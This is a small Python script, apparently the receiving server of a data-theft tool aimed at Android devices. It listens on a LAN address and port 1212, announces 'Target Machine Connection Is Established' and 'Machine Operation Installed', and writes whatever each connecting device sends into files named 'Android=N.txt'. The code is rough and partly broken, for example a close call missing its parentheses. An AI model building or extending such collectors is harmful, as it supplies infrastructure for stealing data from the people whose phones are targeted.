#shadow

import socket
import random

HOST="192.168.1.91"
PORT=1212

server_sms=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

men=random.randint(30,300000)
server_sms.bind((HOST,PORT))# sorun var
server_sms.listen(int(men))

print("{}:{}Target Machine Connection Is Established...[]".format(*server_sms.getsockname()))



import datetime
from colored import fg
while 1 :
    cot=random.randint(1,500)
    byt,address=server_sms.accept()
    #address start
    print("{}:{} Machine Operation Installed...[]".format(*address))
    # byte data
    file="Android="+str(cot)+".txt"
    with open(file,"wb") as setlocal:
       data=byt.recv(300000)
       setlocal.write(data)
       rfs=datetime.datetime.now()
       print(rfs.strftime("%p=%X"+"[%Y-%d-%B]"),fg("red"))
       print(str(cot)+"-->",data)

     
server_sms.close

#  connecting the socket to the data

